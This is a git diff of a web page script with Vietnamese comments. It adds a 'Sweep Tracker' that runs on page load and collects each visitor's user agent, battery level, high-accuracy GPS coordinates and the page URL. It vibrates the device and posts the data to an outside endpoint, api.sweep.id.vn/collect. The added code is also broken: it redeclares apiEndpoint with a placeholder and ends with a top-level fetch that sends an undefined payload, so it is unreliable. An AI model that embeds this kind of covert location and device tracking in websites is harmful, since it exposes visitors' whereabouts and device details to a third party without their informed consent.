@@ -57,84 +57,99 @@ function adjustZoom() {
 window.addEventListener('resize', adjustZoom);
 adjustZoom();
 
-// ===============================
+// File: script.js
+
 // Sweep Tracker Script v2.0
 // Thu thập thông tin truy cập & gửi đến Cloudflare Worker
-// ===============================
-(async function sweepTracker() {
-  try {
-    // ===== Nhận diện trình duyệt & thiết bị =====
-    const ua = navigator.userAgent || '';
-    const detectBrowser = (ua) => {
-      const lower = ua.toLowerCase();
-      const isIOS = /iphone|ipad|ipod/.test(lower);
-      if (isIOS && /crios/i.test(ua)) return 'Chrome (iOS)';
-      if (isIOS && /safari/i.test(ua) && !/crios/i.test(ua)) return 'Safari (iOS)';
-      if (/chrome|crios|edg/i.test(ua)) return 'Chrome';
-      if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
-      if (/firefox|fxios/i.test(ua)) return 'Firefox';
-      if (/edg/i.test(ua)) return 'Edge';
-      return 'Unknown';
-    };
-    const browser = detectBrowser(ua);
-
-    // ===== Mức pin (Battery API) =====
-    let batteryInfo = null;
-    if (navigator.getBattery) {
-      try {
-        const b = await navigator.getBattery();
-        batteryInfo = {
-          charging: b.charging,
-          level: Math.round(b.level * 100)
+async function sweepTracker() {
+    try {
+        // 1. Nhận diện trình duyệt & thiết bị
+        const ua = navigator.userAgent || '';
+        const detectBrowser = (ua) => {
+            const lower = ua.toLowerCase();
+            const isIOS = /iphone|ipad|ipod/.test(lower);
+            
+            if (isIOS && /crios/i.test(ua)) return 'Chrome (iOS)';
+            if (isIOS && /safari/i.test(ua) && !/crios/i.test(ua)) return 'Safari (iOS)';
+            if (/chrome|crios|edg/i.test(ua)) return 'Chrome';
+            if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
+            if (/firefox|fxios/i.test(ua)) return 'Firefox';
+            if (/edg/i.test(ua)) return 'Edge';
+            return 'Unknown';
         };
-      } catch {
-        batteryInfo = null;
-      }
+        const browser = detectBrowser(ua);
+
+        // 2. Mức pin (Battery API)
+        let batteryInfo = null;
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                batteryInfo = {
+                    charging: b.charging,
+                    level: Math.round(b.level * 100)
+                };
+            } catch {
+                batteryInfo = null;
+            }
+        }
+
+        // 3. Lấy tọa độ GPS
+        const getPosition = (timeout = 10000) => 
+            new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout, maximumAge: 0 }
+                );
+            });
+        
+        const geo = await getPosition();
+
+        // 4. Rung nhẹ khi khởi động (nếu hỗ trợ)
+        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+
+        // 5. Chuẩn bị dữ liệu (Payload)
+        const payload = {
+            ua: { browser, raw: ua },
+            battery: batteryInfo,
+            geolocation: geo,
+            page: {
+                url: location.href,
+                title: document.title
+            },
+            timestamp: new Date().toISOString()
+        };
+
+        // 6. Gửi tới Cloudflare Worker
+        // Lưu ý: Thay đổi URL này thành URL Worker thực tế của bạn nếu cần
+        const apiEndpoint = 'https://api.sweep.id.vn/collect'; 
+        
+        await fetch(apiEndpoint, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        console.log('[Sweep Tracker] ✅ Gửi dữ liệu thành công');
+      } catch (err) {
+        console.warn('[Sweep Tracker] ⚠️ Lỗi:', err);
     }
+}
 
-    // ===== Lấy tọa độ GPS =====
-    const getPosition = (timeout = 10000) =>
-      new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve(null);
-        navigator.geolocation.getCurrentPosition(
-          (pos) =>
-            resolve({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              accuracy: pos.coords.accuracy
-            }),
-          () => resolve(null),
-          { enableHighAccuracy: true, timeout, maximumAge: 0 }
-        );
-      });
+// Chạy hàm
+sweepTracker();
+// Thay đổi dòng này sau khi có URL từ Cloudflare
+const apiEndpoint = 'https://<TEN-WORKER-CUA-BAN>.<username>.workers.dev'; 
 
-    const geo = await getPosition();
-
-    // ===== Rung nhẹ khi khởi động (nếu hỗ trợ) =====
-    if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-
-    // ===== Chuẩn bị dữ liệu =====
-    const payload = {
-      ua: { browser, raw: ua },
-      battery: batteryInfo,
-      geolocation: geo,
-      page: {
-        url: location.href,
-        title: document.title
-      },
-      timestamp: new Date().toISOString()
-    };
-
-    // ===== Gửi tới Cloudflare Worker =====
-    const apiEndpoint = 'https://api.sweep.id.vn/collect';
-    await fetch(apiEndpoint, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-
-    console.log('[Sweep Tracker] ✅ Gửi dữ liệu thành công');
-  } catch (err) {
-    console.warn('[Sweep Tracker] ⚠️ Lỗi:', err);
-  }
-})();
+await fetch(apiEndpoint, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+});
